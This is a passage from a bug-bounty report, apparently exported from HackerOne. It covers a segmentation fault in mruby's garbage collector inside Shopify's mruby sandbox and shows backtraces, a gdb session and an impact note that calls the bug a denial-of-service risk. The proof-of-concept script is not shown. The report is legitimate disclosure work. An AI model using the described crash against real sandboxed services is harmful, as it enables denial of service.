0x0000000000000001\n R14: 0x00007f95a60274e0 R15: 0x0000000000000002 EFL: 0x0000000000010206\n\n-- C level backtrace information -------------------------------------------\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f95ab76fea5]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f95ab7700dc]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f95ab64a364]\n/usr/lib/x86_64-linux-gnu/libruby-2.3.so.2.3 [0x7f95ab6fbdbe]\n/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f95ab3ceed0]\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_gc_mark_iv+0x17) [0x7f95a747dea7] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/variable.c:402\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(incremental_gc.part.10+0x1da) [0x7f95a746b4fa] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:604\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_incremental_gc+0x1f3) [0x7f95a746bed3] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:1062\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_obj_alloc+0xfd) [0x7f95a746c58d] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:486\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_instance_new+0x53) [0x7f95a74548f3] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1298\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x762) [0x7f95a746ecf2] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f95a7474567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_run+0x17) [0x7f95a746cbf7] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2442\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_funcall_with_block+0x2fc) [0x7f95a746cefc] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:414\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_instance_new+0xb0) [0x7f95a7454950] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1323\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x762) [0x7f95a746ecf2] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f95a7474567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_run+0x17) [0x7f95a746cbf7] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2442\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_funcall_with_block+0x2fc) [0x7f95a746cefc] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:414\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_instance_new+0xb0) [0x7f95a7454950] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1323\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_exec+0x762) [0x7f95a746ecf2] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mrb_vm_run+0x57) [0x7f95a7474567] /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n/home/jaime/research/shopy/mruby-engine/lib/mruby_engine/mruby_engine.so(mruby_engine_monitored_eval+0x113) [0x7f95a7448173] ../../../../ext/mruby_engine/eval_monitored.c:68\n/lib/x86_64-linux-gnu/libpthread.so.0 [0x7f95ab3c5464]\n/lib/x86_64-linux-gnu/libc.so.6(__clone+0x6d) [0x7f95aa74130d]\n</code></pre>\n<h2 id=\"crash-debug\">Crash debug</h2>\n<pre class=\"highlight plaintext\"><code>(gdb) r\nThe program being debugged has been started already.\nStart it from the beginning? (y or n) y\nStarting program: /usr/bin/ruby /home/jaime/research/shopy/mruby-engine/bin/sandbox /tmp/mark_tbl.min2.rb\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.\n[New Thread 0x7ffff7ff5700 (LWP 5190)]\n[New Thread 0x7ffff2348700 (LWP 5242)]\n\nProgram received signal SIGSEGV, Segmentation fault.\n[Switching to Thread 0x7ffff2348700 (LWP 5242)]\nmark_tbl (t=0x17, mrb=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/variable.c:403\n403         iv_foreach(mrb, t, iv_mark_i, 0);\n(gdb) x/1i $rip\n=&gt; 0x7ffff37efea7 &lt;mrb_gc_mark_iv+23&gt;:  mov    r8d,DWORD PTR [r12]\n(gdb) i r r12\nr12            0x17     23\n(gdb) list *$rip\n0x7ffff37efea7 is in mrb_gc_mark_iv (/home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/variable.c:354).\n349       khash_t(iv) *h = &amp;t-&gt;h;\n350       khiter_t k;\n351       int n;\n352\n353       if (h) {\n354         for (k = kh_begin(h); k != kh_end(h); k++) {\n355           if (kh_exist(h, k)) {\n356             n = (*func)(mrb, kh_key(h, k), kh_value(h, k), p);\n357             if (n &gt; 0) return FALSE;\n358             if (n &lt; 0) {\n</code></pre>\n<p>Backtrace</p>\n<pre class=\"highlight plaintext\"><code>(gdb) bt\n#0  mark_tbl (t=0x17, mrb=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/variable.c:403\n#1  mrb_gc_mark_iv (mrb=mrb@entry=0x7ffff23494e0, obj=obj@entry=0x7ffff23994e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/variable.c:423\n#2  0x00007ffff37dd4fa in gc_mark_children (gc=0x7ffff23495b8, obj=&lt;optimized out&gt;, mrb=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:604\n#3  gc_gray_mark (obj=&lt;optimized out&gt;, gc=0x7ffff23495b8, mrb=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:834\n#4  incremental_marking_phase (limit=&lt;optimized out&gt;, gc=&lt;optimized out&gt;, mrb=&lt;optimized out&gt;) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:929\n#5  incremental_gc (mrb=mrb@entry=0x7ffff23494e0, gc=gc@entry=0x7ffff23495b8, limit=limit@entry=2000) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:1028\n#6  0x00007ffff37dded3 in incremental_gc (limit=&lt;optimized out&gt;, gc=&lt;optimized out&gt;, mrb=&lt;optimized out&gt;) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:1062\n#7  incremental_gc_step (gc=0x7ffff23495b8, mrb=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:1063\n#8  mrb_incremental_gc (mrb=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:1107\n#9  0x00007ffff37de58d in mrb_obj_alloc (mrb=mrb@entry=0x7ffff23494e0, ttype=ttype@entry=MRB_TT_OBJECT, cls=cls@entry=0x7ffff2399420) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/gc.c:486\n#10 0x00007ffff37c68f3 in mrb_instance_alloc (cv=..., mrb=0x7ffff23494e0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1298\n#11 mrb_instance_new (mrb=0x7ffff23494e0, cv=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1322\n#12 0x00007ffff37e0cf2 in mrb_vm_exec (mrb=mrb@entry=0x7ffff23494e0, proc=&lt;optimized out&gt;, proc@entry=0x7ffff234fed0, pc=&lt;optimized out&gt;) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n#13 0x00007ffff37e6567 in mrb_vm_run (mrb=mrb@entry=0x7ffff23494e0, proc=proc@entry=0x7ffff234fed0, self=..., stack_keep=3) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n#14 0x00007ffff37debf7 in mrb_run (mrb=mrb@entry=0x7ffff23494e0, proc=proc@entry=0x7ffff234fed0, self=..., self@entry=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2442\n#15 0x00007ffff37deefc in mrb_funcall_with_block (mrb=mrb@entry=0x7ffff23494e0, self=..., self@entry=..., mid=&lt;optimized out&gt;, argc=&lt;optimized out&gt;, argc@entry=1, argv=argv@entry=0x7ffff235bb70, blk=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:414\n#16 0x00007ffff37c6950 in mrb_instance_new (mrb=0x7ffff23494e0, cv=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1323\n#17 0x00007ffff37e0cf2 in mrb_vm_exec (mrb=mrb@entry=0x7ffff23494e0, proc=&lt;optimized out&gt;, proc@entry=0x7ffff234fed0, pc=&lt;optimized out&gt;) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n#18 0x00007ffff37e6567 in mrb_vm_run (mrb=mrb@entry=0x7ffff23494e0, proc=proc@entry=0x7ffff234fed0, self=..., stack_keep=3) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n#19 0x00007ffff37debf7 in mrb_run (mrb=mrb@entry=0x7ffff23494e0, proc=proc@entry=0x7ffff234fed0, self=..., self@entry=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:2442\n#20 0x00007ffff37deefc in mrb_funcall_with_block (mrb=mrb@entry=0x7ffff23494e0, self=..., self@entry=..., mid=&lt;optimized out&gt;, argc=&lt;optimized out&gt;, argc@entry=1, argv=argv@entry=0x7ffff235bb18, blk=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:414\n#21 0x00007ffff37c6950 in mrb_instance_new (mrb=0x7ffff23494e0, cv=...) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/class.c:1323\n#22 0x00007ffff37e0cf2 in mrb_vm_exec (mrb=mrb@entry=0x7ffff23494e0, proc=&lt;optimized out&gt;, proc@entry=0x7ffff2351520, pc=&lt;optimized out&gt;) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:1165\n#23 0x00007ffff37e6567 in mrb_vm_run (mrb=0x7ffff23494e0, proc=0x7ffff2351520, self=..., stack_keep=stack_keep@entry=0) at /home/jaime/research/shopy/mruby-engine/ext/mruby_engine/mruby/src/vm.c:766\n#24 0x00007ffff37ba173 in mruby_engine_monitored_eval (data=0x7ffff23493e0) at ../../../../ext/mruby_engine/eval_monitored.c:68\n#25 0x00007ffff7737464 in start_thread (arg=0x7ffff2348700) at pthread_create.c:333\n#26 0x00007ffff6ab330d in clone () at ../sysdeps/unix/sysv/linux/x86_64/clone.S:109\n</code></pre>\n<h2 id=\"impact\">Impact</h2>\n\n<p>Its impact seems to be limited to DoS of the service running the ruby sandbox. The invalid address can be controlled by the user but in a really limited way, so I doubut this chould be turned into a write-what-where type vuln.</p>\n", 
    "severity_rating": "high", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.mruby.science", 
            "about": "", 
            "twitter_handle": "", 
            "name": "shopify-scripts"
        }, 
        "handle": "shopify-scripts", 
        "url": "https://hackerone.com/shopify-scripts", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/015/668/9f47d94cbd9e4311b57f1ab05f67fb5c26fd2e78_small.jpg?1475592254", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/015/668/b50db49e93f656e202ae6f94b4c0821d1184134b_medium.jpg?1475592254"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 15668, 
        "default_currency": "usd"
    }, 
    "is_published": false
}